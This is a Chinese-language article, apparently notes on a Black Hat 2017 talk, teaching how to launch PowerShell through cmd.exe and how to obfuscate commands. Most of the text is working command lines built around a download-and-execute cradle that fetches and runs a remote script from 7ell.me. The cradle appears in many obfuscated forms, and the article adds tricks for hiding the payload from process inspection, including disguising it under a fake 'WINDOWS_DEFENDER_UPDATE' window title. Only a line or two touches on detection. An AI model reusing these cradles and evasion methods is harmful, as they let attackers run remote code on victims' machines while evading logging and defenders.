# 【技术分享】根据powershell语言的特性来混淆代码的方法与原理
|
##### 译文声明
本文是翻译文章，文章来源：blackhat.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
[](http://p2.qhimg.com/t01136e71dcb6ed8569.png)
译者：[七三](http://bobao.360.cn/member/contribute?uid=1252619100)
预估稿费：120RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**  
**
**简介**
大多数攻击者目前已经将PowerShell
利用在了各种攻击场景中，如内网渗透，APT攻击甚至包括现在流行的勒索软件中。powershell的功能强大且调用方式十分灵活。在今年的2017
blackhat大会上，有一个关于powershell的议题（地址：us-17-Bohannon-Revoke-Obfuscation-PowerShell-Obfuscation-Detection-And%20Evasion-Using-Science），主要就是讲了powershell的混淆与检测。在看完作者的PPT后，真觉得干货颇多，想来做做笔记记录一下。
这篇笔记就来详细介绍一下根据powershell语言的特性来混淆代码的方法与原理。
**1\. cmd启动powershell**
首先看看powershel使用cmd.exe启动执行代码的方式：
**1.1 常规方法**
    cmd.exe /c "powershell -c Write-Host SUCCESS -Fore Green"
    cmd.exe /c "echo Write-Host SUCCESS -Fore Green | powershell -"
    cmd /c "set p1=power&& set p2=shell&& cmd /c echo Write-Host SUCCESS -Fore Green ^|%p1%%p2% -"
**1.2 管道输入流**
    cmd.exe /c "echo Write-Host SUCCESS -Fore Green | powershell IEX $input"
**1.3 利用环境变量**
    cmd.exe /c "set cmd=Write-Host ENV -Fore Green&&powershell IEX $env:cmd"
    cmd.exe /c "set cmd=Write-Host ENV -Fore Green&&cmd /c echo %cmd%|powershell -    cmd.exe /c "set cmd=Write-Host ENV -Fore Green&&powershell IEX ([Environment]::GetEnvironmentVariable('cmd', 'Process'))
    cmd.exe /c "set cmd=Write-Host ENV -Fore Green&&powershell IEX ((Get-ChildItem/ChildItem/GCI/DIR/LS env:cmd).Value)
在父进程中隐藏运行的代码：上面第二种方式运行时，如果使用进程查看，可以在父进程启动参数中cmd.exe /c "set cmd=Write-Host ENV
-Fore Green&&cmd /c echo %cmd%|powershell -,看到你执行的代码，因为此时powershell
-的父进程时第一个cmd.exe，所以可以使用cmd中的转义符号^将|转义后，如
cmd.exe /c "set cmd=Write-Host ENV -Fore Green&&cmd /c echo %cmd%^|powershell
-,第二个cmd后面对命令行来说是一个整体，然后执行cmd /c echo %cmd%|powershell -,此时powershell
-的父进程就是第二个cmd了，看不到我们执行的代码了。
**1.4 从其他进程获取参数**
首先启动多个cmd进程，这些进程参数中包含要执行的代码
    cmd /c "title WINDOWS_DEFENDER_UPDATE&&echo IEX (IWR https://7ell.me/power)&& FOR /L %i IN (1,1,1000) DO echo"
然后在powershell中提取出来IEX (IWR https://7ell.me/power)执行，如：
    cmd /c "powershell IEX (Get-WmiObject Win32_Process -Filter ^"Name = 'cmd.exe' AND CommandLine like '%WINDOWS_DEFENDER_UPDATE%'^").CommandLine.Split([char]38)[2].SubString(5)"
**1.5 从粘贴板**
    cmd.exe /c "echo Write-Host CLIP -Fore Green | clip&& powershell [void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); IEX ([System.Windows.Forms.Clipboard]::GetText())"
这些方法可以在powershell日志中看到，所以开启powershell的日志分析很重要。
但是，如果时混淆的，日志中也仅仅是记录了混淆后的东西。
**2\. 混淆**
Hacker在攻击时经常会远程下载代码脚本执行，这里基于这样的一条标准的下载文件命令来进行变形混淆。
    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("http://7ell.me/power")。
在混淆之前，先看看powershell获取环境变量的方式。
    Get-Variable/GV/Variable cmd -ValueOnly
-ValueOnly可以简写为-ValueOnly,-ValueOnl,-ValueOn,-ValueO……,-Va,-V
    (Get-Item/GI/Item Variable:cmd).Value
    (Get-ChildItem/GCI/ChildItem/DIR/LS Variable:cmd).Value
后面很多构造会用到这些方式的。
**2.0 简单处理**
    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("http://7ell.me/power")
可以去掉System
    Invoke-Expression (New-Object Net.WebClient).DownloadString("http://7ell.me/power")
将http分开+号连接
    Invoke-Expression (New-Object Net.WebClient).DownloadString("ht"+"tp://7ell.me/power")
变量代替
    IEX $wc=New-Object Net.WebClient;$wc.DownloadString('h'+'ttp://7ell.me/power')
把downloadstring使用单双引号引起来
    Invoke-Expression (New-Object Net.WebClient)."DownloadString"('h'+'ttp://7ell.me/power')
使用invoke方法
    Invoke-Expression (New-Object Net.WebClient).("DownloadString").Invoke('h'+'ttp://7ell.me/power')
    $ds="Down"+"loadString";Invoke-Expression (New-Object Net.WebClient).$ds.Invoke('h'+'ttp://7ell.me/power')
以上单双引号可以切换
**2.1 转义符(反引号)**
查看帮助Get-Help about_Escape_Characters
以下为 Windows PowerShell 能够识别的特殊字符：
        0     Null
        `a    警报
        `b    退格
        `f    换页
        `n    换行
        `r    回车
        `t    水平制表
        `v    垂直制表
转义符号加在其他字符前不影响字符的意思，避免在0,a,b,f,n,r,t,v的小写字母前出现即可。
    Invoke-Expression (New-Object Net.WebClient)."Down`loadString"('h'+'ttp://7ell.me/power')
    Invoke-Expression (New-Object Net.WebClient)."D`o`wn`l`oad`Str`in`g"('h'+'ttp://7ell.me/power') 
    Invoke-Expression (New-Object Net.WebClient)."D`o`w`N`l`o`A`d`S`T`R`in`g"('h'+'ttp://7ell.me/power')
同样可以使用在Net.Webclient上
    Invoke-Expression (New-Object "`Ne`T.`Web`Cli`ent")."Down`l`oadString"('h'+'ttp://7ell.me/power')
括号代替空格，或者多个定义变量来连接替换
    Invoke-Expression (New-Object("`Ne`T.`Web`Cli`ent"))."Down`l`oadString"('h'+'ttp://7ell.me/power')
    $v1="Net.";$v2="WebClient";Invoke-Expression (New-Object $v1$v2)."Down`l`oadString"('h'+'ttp://7ell.me/power')
**2.2 简写与通配符***
e.g Get-Comamd New-Ob*
以下几种处理都可以代替 Get-Command New-Object ; Get-Comamnd 可简写为 GCM
    &(Get-Command New-Obje*)     &(Get-Command *w-O*)     &(GCM *w-O*)     &(COMMAND *w-*ct)
    .(Get-Command New-Obje*)     .(Get-Command *w-O*)     .(GCM *w-O*)     .(COMMAND *w-*ct)
    $var1="New";$var2="-Object";$var3=$var1+$var2;&(GCM $var3)
结合其他方法混淆
    Invoke-Expression (&(Get-Command New-Obje*)"Net.WebClient")."DownloadString"('h'+'ttp://7ell.me/power')
    $var1="New";$var2="-Object";$var3=$var1+$var2;Invoke-Expression (&(GCM $var3)"Net.WebClient")."DownloadString"('h'+'ttp://7ell.me/power')
    ie`x (.(GCM *w-O*)"Net.WebClient")."DownloadString"('h'+'ttp://7ell.me/power')
**2.3 脚本块**
使用脚本块
    invoke-command{xxxx}   ICM{xxxx}   {xxxx}.invoke()    &{xxxx}    .{xxxx}
    $ExecutionContext.InvokeCommand.NewScriptBlock("xxxxx")
    ${ExecuTioNCoNTexT}."INVokeCommANd"."NewScRipTBlock"("expression")
    $ExecutionContext."`I`N`V`o`k`e`C`o`m`m`A`N`d"."`N`e`w`S`c`R`i`p`T`B`l`o`c`k"("expression") 
    ${`E`x`e`c`u`T`i`o`N`C`o`N`T`e`x`T}."`I`N`V`o`k`e`C`o`m`m`A`N`d"."`N`e`w`S`c`R`i`p`T`B`l`o`c`k"("expression") 
    $a = ${`E`x`e`c`u`T`i`o`N`C`o`N`T`e`x`T}; $b = $a."`I`N`V`o`k`e`C`o`m`m`A`N`d";$b."`N`e`w`S`c`R`i`p`T`B`l`o`c`k"("ex"+"pres"+"sion")
Scriptblock类方法,[Scriptblock]相当于[Type]("Scriptblock")
    [Scriptblock]::Create("expression")
    ([Type]"Scriptblock")::create('expression')
    [Scriptblock]::("Create").Invoke("expression")
    ([Type]("Scriptblock"))::("Create").Invoke("expression")
    [Scriptblock]::("`C`R`e"+"`A`T`e").Invoke("expression") 
    ([Type]("Scr"+"ipt"+"block"))::("`C`R`e"+"`A`T`e").Invoke("ex"+"pres"+"sion")
可以构造出下面的式子混淆  
    .(${`E`x`e`c`u`T`i`o`N`C`o`N`T`e`x`T}."`I`N`V`o`k`e`C`o`m`m`A`N`d")."`N`e`w`S`c`R`i`p`T`B`l`o`c`k"((& (`G`C`M *w-O*)"`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"('h'+'ttp://7ell.me/power'))
**2.4 字符串处理**
反转
    $reverseCmd= ")'rewop/em.lle7//:ptth'(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(";
    1. IEX ($reverseCmd[-1..-($reverseCmd.Length)] -Join '') | IEX
    2. $reverseCmdCharArray= $reverseCmd.ToCharArray(); [Array]::Reverse($reverseCmdCharArray); IEX ($reverseCmdCharArray-Join '') | IEX
    3. IEX (-Join[RegEx]::Matches($reverseCmd,'.','RightToLeft')) | IEX
分割截断 or 替换字符
    $cmdWithDelim= "(New-Object Net.We~~bClient).Downlo~~adString('http://7ell.me/power')";
    1. IEX ($cmdWithDelim.Split("~~") -Join '') | IEX
    2. IEX $cmdWithDelim.Replace("~~","") | IEX
    3. IEX ($cmdWithDelim-Replace "~~","") | IEX